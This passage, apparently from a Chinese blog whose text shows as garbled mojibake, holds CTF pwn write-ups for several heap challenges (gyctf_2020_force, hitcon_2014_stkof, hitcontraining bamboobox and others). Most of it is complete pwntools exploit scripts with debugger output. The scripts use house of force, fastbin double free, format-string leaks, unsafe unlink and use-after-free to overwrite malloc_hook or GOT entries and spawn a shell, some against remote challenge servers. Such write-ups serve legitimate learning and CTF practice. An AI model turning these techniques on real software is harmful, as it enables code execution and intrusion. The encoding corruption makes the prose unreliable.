ˆä¸­çš„æ•°æ®ï¼Œä¿®æ”¹IPçš„å€¼ï¼Œä»è€Œå®ç°è¿‘è½¬ç§»ã€‚CPUæ‰§è¡ŒretæŒ‡ä»¤æ—¶ï¼Œè¿›è¡Œä¸‹é¢ä¸¤æ­¥æ“ä½œï¼š(IP)=((SS)*16+(SP))(SP)=(SP)+2;&#x27;&#x27;&#x27;pl2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)io.send(pl2)io.recvline()puts_add=u64(io.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base=puts_add-0x06f690one_gadget=libc_base+0x4526apl3=&#x27;a&#x27;*0x60+&#x27;bbbbbbbb&#x27;+p64(one_gadget)io.send(pl3)io.interactive() gyctf_2020_force 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA æœ‰ç”¨çš„åŸºæœ¬åªæœ‰add 1234567def add(sz,text): p.sendlineafter(&quot;2:puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(sz)) p.recvuntil(&quot;bin addr &quot;) addr = int(p.recvuntil(&#x27;\\n&#x27;).strip(), 16) p.sendafter(&quot;content\\n&quot;,text) return addr add 123456puts(&quot;size&quot;);read(0, nptr, 0xFuLL);size = atol(nptr);*(_QWORD *)i = malloc(size);if ( !*(_QWORD *)i ) exit(0); addä¼šè¿”å›å †çš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è·å–åç§»é‡ addåŒæ—¶å­˜åœ¨å †æº¢å‡ºï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥è¦†ç›– top chunkçš„ sizeåŸŸ å¯ä»¥å¤šæ¬¡ç”³è¯·ã€‚ç»¼ä¸Šï¼Œç¬¦åˆhouse of forceçš„æ”»å‡»æ¡ä»¶ 1.libc leak 2.hof 3.malloc_hook+one gadget 3.GDB 0x1 libc leak 12345678910111213141:add2:puts1size2097152 bin addr 0x7ffff780c010contentaaaa&gt;vmmap0x7ffff780c000 0x7ffff7a0d000 rw-p 201000 0 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so&gt;In python&gt;&gt;&gt; hex(0x7ffff7a0d000 - 0x7ffff780c010)&#x27;0x200ff0&#x27; å¾—åˆ°åç§» 0x200ff0 0x2 house of force 1234567891011121314151617181920212223242526#code: addr = add(0x200000,&#x27;aaaaaa&#x27;) base = addr + 0x200ff0 log.success(&quot;libc base &gt;&gt;0x%x&quot;,base) top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10 log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top) gdb.attach(p)#gdb:pwndbg&gt; heap0x5559b4dfa000 FASTBIN &#123; prev_size = 0, size = 33, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x0, bk_nextsize = 0xffffffffffffffff&#125;pwndbg&gt; x/12gx 0x5559b4dfa0000x55d5b01aa000: 0x0000000000000000 0x00000000000000210x55d5b01aa010: 0x6161616161616161 0x61616161616161610x55d5b01aa020: 0x0000000000000000 0xffffffffffffffff0x55d5b01aa030: 0x0000000000000000 0x0000000000000000#è¾“å‡º:[+] Starting local process &#x27;./gyctf_2020_force&#x27;: pid 50956[+] libc base &gt;&gt;0x7fc48892d000[+] top chunk &gt;&gt;0x55d5b01aa020 123456789#code: add((offset-0x33),&quot;aaaa&quot;) #è€ƒè™‘åˆ°å†…å­˜å¯¹é½ï¼Œç»è¿‡è°ƒè¯•å¯å¾—offset-0x33æ—¶ï¼Œå¯ä»¥ç”³è¯·åˆ°malloc_hook-0x21çš„å†…å­˜ add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16))#gdb:0x7f7a6909aaef &lt;_IO_wide_data_0+303&gt;: 0x007f7a6909926000 0x00000000000021000x7f7a6909aaff: 0x6161616161616100 0x007f7a68d1b26a610x7f7a6909ab0f &lt;__realloc_hook+7&gt;: 0x007f7a68d5a6d000 0xffd61c20d2750900 &lt;-è¿™é‡Œè°ƒæ•´å †æ ˆï¼Œä½¿one gadgetå¯ç”¨0x7f7a6909ab1f: 0x00000100000000ff 0x0000000000000000 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#context.log_level = &quot;debug&quot;elf = ELF(&quot;./gyctf_2020_force&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./gyctf_2020_force&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;28528&quot;)def add(sz,text): p.sendlineafter(&quot;puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(sz)) p.recvuntil(&quot;0x&quot;) addr = int(p.recv(12),16) p.sendafter(&quot;content\\n&quot;,text) return addrif __name__ == &#x27;__main__&#x27;: addr = add(0x200000,&#x27;aaaaaa&#x27;) base = addr + 0x200ff0 log.success(&quot;libc base &gt;&gt;0x%x&quot;,base) top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10 log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top) #gdb.attach(p) malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;] realloc = base+libc.sym[&quot;__libc_realloc&quot;] one_gadget = 0x4526a + base offset = malloc_hook-top log.success(&quot;malloc hook &gt;&gt;0x%x&quot;,malloc_hook) log.success(&quot;realloc hook &gt;&gt;0x%x&quot;,realloc) log.success(&quot;offset &gt;&gt;0x%x&quot;,offset) add((offset-0x33),&quot;aaaa&quot;) add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16)) #gdb.attach(p) p.sendlineafter(&quot;puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(0x20)) p.interactive() gyctf_2020_some_thing_exceting 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA ä¸‰å¤§åŠŸèƒ½ 1234567891011121314def add(ba_sz,ba_text,na_sz,na_text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(ba_sz)) p.sendlineafter(&quot;:&quot;,str(ba_text)) p.sendlineafter(&quot;:&quot;,str(na_sz)) p.sendlineafter(&quot;:&quot;,str(na_text))def delete(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def view(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) flag 123456789101112131415161718unsigned __int64 flag()&#123; FILE *stream; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); stream = fopen(&quot;/flag&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); exit(0); &#125; byte_6020A0 = 96; fgets(s, 45, stream); return __readfsqword(0x28u) ^ v2;&#125; åé—¨å‡½æ•° delete 123free(*(void **)ptr[v1]);free(*((void **)ptr[v1] + 1));free(ptr[v1]); freeæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå¯ä»¥ç›´æ¥æ¥ä¸Š 3.EXP 1234567891011121314151617181920212223242526272829303132333435from pwn import *#context.log_level = &quot;debug&quot;elf = ELF(&quot;./something&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p = process(&quot;./something&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25754&quot;)def add(ba_sz,ba_text,na_sz,na_text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(ba_sz)) p.sendlineafter(&quot;:&quot;,str(ba_text)) p.sendlineafter(&quot;:&quot;,str(na_sz)) p.sendlineafter(&quot;:&quot;,str(na_text))def delete(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def view(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: add(0x50,&#x27;0000&#x27;,0x50,&#x27;1111&#x27;)#0 add(0x50,&#x27;2222&#x27;,0x50,&#x27;3333&#x27;)#1 delete(0) delete(1) delete(0) add(0x50,p64(0x602098),0x50,&#x27;Chunk_2&#x27;)#0 add(0x50,&#x27;Chunk_3&#x27;,0x50,&#x27;Chunk_4&#x27;)#1--&gt;in 0x602098 add(0x50,&#x27;f&#x27;,0x60,&#x27;2&#x27;)#0 view(4) p.interactive() gyctf_2020_some_thing_interesting 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA sub_B7A 123456read(0, s1, 0x13uLL); if ( strncmp(s1, &quot;OreOOrereOOreO&quot;, 14uLL) ) // åªæ¯”è¾ƒäº†å‰14ä¸ªï¼Œåé¢å¯ä»¥å¸¦ä¸œè¥¿ &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); exit(0); &#125; å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œè¿™é‡Œå¯ä»¥æ³„éœ²åœ°å€ delete 1234567891011121314151617181920212223unsigned __int64 delete()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;#######################&quot;); puts(&quot;# Delete Oreo #&quot;); puts(&quot;#---------------------#&quot;); printf(&quot;&gt; Oreo ID : &quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt; 0 || v1 &gt; 10 || !chunk[v1] ) // æ£€æŸ¥idxåˆæ³• &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); Exit(); &#125; free(chunk[v1]); // æŒ‡é’ˆæœªæ¸…é›¶ free(re_chunk[v1]); // å¯¼è‡´uaf puts(&quot;#---------------------#&quot;); puts(&quot;# ALL Down! #&quot;); puts(&quot;#######################&quot;); return __readfsqword(0x28u) ^ v2;&#125; freeåæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œé€ æˆuaf 3.exp1 åç§»é‡è®¡ç®— 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)sh = 0counter=&quot;&quot;def start(i): sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%&quot;+str(i)+&quot;$p&quot;)def check_in(i): sh.sendlineafter(&quot;:&quot;,&quot;0&quot;) sh.recvuntil(&quot;OreOOrereOOreO&quot;) str1 = sh.recv(16) #print str1 if &quot;0x7f&quot; in str1: success(&quot;This can be tested&quot;) global counter counter+= &quot; &quot;+str(i)+&quot; &quot; print &quot;\\n&quot; print &quot;\\n&quot; else: pass def offset_count(ip,port,mode,debug,i): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;) else: sh = remote(ip,port) start(i) check_in(i) sh.close()if __name__ == &#x27;__main__&#x27;: for i in range(4,20): #success(&quot;Now round %d&quot;,i) offset_count(1,1,0,1,i) print &quot;can be tested &gt;&quot; print counter å¾—åˆ° 4 6 7 10 11 12 14 16 17 19 æœ€ç»ˆå¾—åˆ°åç§»é‡ä¸º 17 è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ *b $rebase(åç§»åœ°å€) æ¥æ…¢æ…¢è®¡ç®—å¾—åˆ°åç§» 3.exp2 æ”»å‡» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)sh = 0def leak_addr(): sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%17$p&quot;) sh.sendlineafter(&quot;:&quot;,&quot;0&quot;) sh.recvuntil(&quot;OreOOrereOOreO0x&quot;) return int(sh.recv(12),16)def create(o_sz,o_text,re_sz,re_text): sh.sendlineafter(&quot;:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;: &quot;,str(o_sz)) sh.sendlineafter(&quot;: &quot;,o_text) sh.sendlineafter(&quot;: &quot;,str(re_sz)) sh.sendlineafter(&quot;: &quot;,re_text)def edit(idx,o_text,re_text): sh.sendlineafter(&quot;:&quot;,&quot;2&quot;) sh.sendlineafter(&quot;: &quot;,str(idx)) sh.sendlineafter(&quot;: &quot;,o_text) sh.sendlineafter(&quot;: &quot;,re_text)def delete(idx): sh.sendlineafter(&quot;:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;: &quot;,str(idx))def show(idx): sh.sendlineafter(&quot;:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;: &quot;,str(idx))def pwn(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;) else: sh = remote(ip,port) leak = leak_addr() base = leak-0x20830 one_gadget = 0xf1147+base malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;] success(&quot;base -&gt; 0x%x&quot;,base) success(&quot;one gadget -&gt; 0x%x&quot;,one_gadget) success(&quot;malloc hook -&gt; 0x%x&quot;,malloc_hook) create(0x68,&#x27;aaaa&#x27;,0x68,&#x27;1111&#x27;) #1 create(0x68,&#x27;aaaa&#x27;,0x68,&#x27;1111&#x27;) #2 delete(1) delete(2) delete(1) create(0x68,p64(malloc_hook-35),0x68,&#x27;1111&#x27;) #1 create(0x68,p64(malloc_hook-35),0x68,&#x27;1111&#x27;) #2 create(0x68,p64(malloc_hook-35),0x68,&quot;a&quot;*0x13+p64(one_gadget)) #1 sh.sendlineafter(&quot;:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;: &quot;,&quot;20&quot;) sh.interactive()if __name__ == &#x27;__main__&#x27;: pwn(&quot;node3.buuoj.cn&quot;,29443,1,1) hitcon_2014_stkof 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA ç¨‹åºå¤ªç®€é™‹äº†ï¼Œå‡ ä¹æ²¡æœ‰äº¤äº’ï¼Œèƒ½ç”¨çš„æœ‰ä¸‰ä¸ªåŠŸèƒ½ 12345678910111213def add(sz): p.snedline(&quot;1&quot;) p.snedline(str(sz))def edit(chunk,size,strs): p.sendline(&quot;2&quot;) p.sendline(chunk) p.sendline(size) p.sendline(strs)def free(chunk): p.sendline(&quot;3&quot;) p.sendline(chunk) sub_4009E8() edit 12345for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; æ²¡æœ‰æ§åˆ¶è¾“å…¥èŒƒå›´ï¼Œå¯ä»¥å †æº¢å‡º å…¨å±€å˜é‡s 1234567.bss:0000000000602104 align 40h.bss:0000000000602140 ; char *s[1049600].bss:0000000000602140 s dq ? ; DATA XREF: add+78â†‘w.bss:0000000000602140 ; edit+60â†‘r ....bss:0000000000602148 db ? ;.bss:0000000000602149 db ? ;.bss:000000000060214A db ? ; æ€è·¯ æœ‰å †æº¢å‡ºï¼Œæœ‰å…¨å±€æŒ‡é’ˆå˜é‡ï¼Œæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œæ‰€ä»¥ç”¨unlinkæ”¹free@got ä¸º putsï¼Œå†æ¬¡è°ƒç”¨freeå°±ç›¸å½“äºè°ƒç”¨putsï¼Œä»è€Œlibc leak å¡«å…¥onegedgetæˆ–è€…è¯¥å‡½æ•°ä¸ºsystemå¹¶æ‰§è¡Œbinshï¼Œä»è€Œgetshell 3.GDB unlinkéƒ¨ä»½ 1234567891011121314151617181920212223#unlink#code: alloc(0x100) # idx 1 alloc(0x30) # idx 2 alloc(0x80) # idx 3 head = 0x602140 #å…¨å±€å˜é‡ #fake chunk payload = p64(0) payload += p64(0x20) payload += p64(head + 16 - 0x18) payload += p64(head + 16 - 0x10) payload += p64(0x20) payload = payload.ljust(0x30, &#x27;a&#x27;) payload += p64(0x30) payload += p64(0x90) edit(2, len(payload), payload) #unlink free(3) p.recvuntil(&#x27;OK\\n&#x27;) gdb.attach(p) gdb 1234567891011121314151617181920212223242526272829303132333435363738394041420x1561000 PREV_INUSE &#123; prev_size = 0, size = 4113, fd = 0xa33, bk = 0x20, fd_nextsize = 0x602138, bk_nextsize = 0x602140&#125;0x1562010 PREV_INUSE &#123; prev_size = 0, size = 273, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x1562120 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x1562530 FASTBIN &#123; prev_size = 0, size = 65, fd = 0x0, bk = 0x20ac1, fd_nextsize = 0x602138, bk_nextsize = 0x602140&#125;pwndbg&gt; x/32gx 0x15610000x1561000: 0x0000000000000000 0x00000000000010110x1561010: 0x0000000000000a33 0x0000000000000020 fake fd fake bk0x1561020: 0x0000000000602138 0x00000000006021400x1561030: 0x0000000000000020 0x61616161616161610x1561040: 0x0000000000000030 0x00000000000000900x1561050: 0x0000000000000000 0x00000000000000000x1561060: 0x0000000000000000 0x0000000000000000 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./stkof&quot;)libc = ELF(&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;)#p = process(&quot;./stkof&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25342&quot;)def alloc(size): p.sendline(&#x27;1&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;OK\\n&#x27;)def edit(idx, size, content): p.sendline(&#x27;2&#x27;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&#x27;OK\\n&#x27;)def free(idx): p.sendline(&#x27;3&#x27;) p.sendline(str(idx))if __name__ == &#x27;__main__&#x27;: alloc(0x100) # idx 1 alloc(0x30) # idx 2 alloc(0x80) # idx 3 head = 0x602140 #global pointer payload = p64(0) #prev_size payload += p64(0x20) #size --&gt; except the first line, the rest two line is equal to 0x20? payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) # overwrite global[3]&#x27;s chunk&#x27;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) #0x30 is the front one whole size? # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2]) - 0x18 = head - 8 free(3) p.recvuntil(&#x27;OK\\n&#x27;) #gdb.attach(p) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &#x27;a&#x27; * 8 + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.got[&#x27;atoi&#x27;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(elf.plt[&#x27;puts&#x27;]) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&#x27;\\nOK\\n&#x27;, drop=True).ljust(8, &#x27;\\x00&#x27;) puts_addr = u64(puts_addr) log.success(&#x27;puts addr: &#x27; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;] binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;)) system_addr = libc_base + libc.symbols[&#x27;system&#x27;] log.success(&#x27;libc base: &#x27; + hex(libc_base)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh_addr)) log.success(&#x27;system addr: &#x27; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive() hitcontraining_uaf Use_After_Free 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA å¾—åˆ°å‡ ä¸ªé€‰é¡¹+åé—¨ 1234def add(sz,text): p.sendlineafter(&quot;choice :&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) 123def dele(idx): p.sendlineafter(&quot;choice :&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 123def show(idx): p.sendlineafter(&quot;choice :&quot;,&quot;3&quot;) p.sendlineafter(&quot;choice :&quot;,str(idx)) backdoor: 1234int magic()&#123; return system(&quot;cat /home/hacknote/flag&quot;);&#125; freeï¼š 123free(*((void **)notelist[v1] + 1)); free(notelist[v1]); puts(&quot;Success&quot;); è¿™é‡ŒfreeåæŒ‡é’ˆæœªæ¸…é€ æˆUAF EXP 123456789101112131415161718192021222324252627from pwn import *p = process(&quot;./hacknote&quot;)def addnote(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content)def delnote(idx): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def printnote(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: magic = 0x08048986 system = 0x8048506 addnote(32,&quot;ddaa&quot;) addnote(32,&quot;ddaa&quot;) addnote(32,&quot;ddaa&quot;) delnote(0) delnote(1) addnote(8,p32(magic)) printnote(0) p.interactive() hitcontraining_bamboobox Unlink or House_Of_Force checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) IDA 1234def add(length,name): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(length)) p.sendlineafter(&quot;:&quot;,name) 12345def edit(idx,length,name): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(length)) p.sendlineafter(&quot;:&quot;,name) 123def free(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 12def show(): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) back_door 12345678910111213void __noreturn magic()&#123; int fd; // ST0C_4 char buf; // [rsp+10h] [rbp-70h] unsigned __int64 v2; // [rsp+78h] [rbp-8h] v2 = __readfsqword(0x28u); fd = open(&quot;/home/bamboobox/flag&quot;, 0); read(fd, &amp;buf, 0x64uLL); close(fd); printf(&quot;%s&quot;, &amp;buf); exit(0);&#125; change_item 123456 printf(&quot;Please enter the length of item name:&quot;, &amp;buf); read(0, &amp;nptr, 8uLL); v0 = atoi(&amp;nptr); printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr); *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;&#125; å †æº¢å‡º **1.unsafe unlink: **å¯¹è¿›è¡Œ unlink chunk è¿›è¡Œå†…å­˜å¸ƒç„¶åå€ŸåŠ© unlink æ“ä½œæ¥è¾¾æˆä¿®æ”¹æŒ‡é’ˆçš„æ•ˆæœã€‚ä¸ªäººè®¤ä¸ºé€šè¿‡å †æº¢å‡ºä¼ªé€ ä¸€ä¸ªchunä¼ªé€ çš„chunkä¸€èˆ¬åœ¨fdå’Œbkä¸Šä¸åŒ **2.house of force: ** è¿›è¡Œå †åˆ†é…å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚ é‚£å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆå¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚ --CTFWiKi éœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å° EXP-1 unlink åŸç‰ˆEXPæ–¹ä¾¿ç†è§£æ‰€ä»¥ç›´æ¥æ‹¿æ¥ç”¨äº† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11011r = remote(host,port)def additem(length,name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name)def modify(idx,length,name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name)def remove(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)additem(0x40,&quot;a&quot;*8)additem(0x80,&quot;b&quot;*8)additem(0x40,&quot;c&quot;*8)ptr = 0x6020c8fake_chunk = p64(0) #prev_sizefake_chunk += p64(0x41) #sizefake_chunk += p64(ptr-0x18) #fdfake_chunk += p64(ptr-0x10) #bkfake_chunk += &quot;c&quot;*0x20fake_chunk += p64(0x40)#ä¿®å¤fake_chunk += p64(0x90)#ä¿®å¤modify(0,0x80,fake_chunk) #unlinkremove(1)payload = p64(0)*2payload += p64(0x40) + p64(0x602068)modify(0,0x80,payload)show() #libc base leakr.recvuntil(&quot;0 : &quot;)atoi = u64(r.recvuntil(&quot;:&quot;)[:6].ljust(8,&quot;\\x00&quot;))libc = atoi - 0x36e80print &quot;libc:&quot;,hex(libc)system = libc + 0x45390modify(0,0x8,p64(system))r.recvuntil(&quot;:&quot;)r.sendline(&quot;sh&quot;)r.interactive() è¿™é‡Œå¯ä»¥çœ‹è§æˆ‘ä»¬ä¼ªé€ çš„å †ç»“æ„: 12345678ptr = 0x6020c8fake_chunk = p64(0) #prev_sizefake_chunk += p64(0x41) #sizefake_chunk += p64(ptr-0x18) #fdfake_chunk += p64(ptr-0x10) #bkfake_chunk += &quot;c&quot;*0x20fake_chunk += p64(0x40)fake_chunk += p64(0x90) 3.EXP-2 house of force 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *r = process(&quot;./bamboobox&quot;)elf = ELF(&quot;./bamboobox&quot;)def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context)def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context)def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx))def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)def exit(): r.sendlineafter(&quot;:&quot;, &quot;5&quot;)alloc(0x30,&#x27;aaaa&#x27;)payload=&#x27;a&#x27;*0x30+p64(0)+p64(0xffffffffffffffff) #house of forceedit(0,0x40,payload)magic=elf.sym[&#x27;magic&#x27;]malloc_size = -(0x40 + 0x20)-0x10alloc(malloc_size,&#x27;aaaa&#x27;)alloc(0x10,p64(magic)*2)exit()r.interactive() hitcontraining_magicheap Unsorted_Bin_Attack æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆ 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 1234def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) 12345def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text)) 123def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int l33t()&#123; return system(&quot;/bin/sh&quot;);&#125; edit_heap 123456printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1); read(0, (char *)&amp;v1 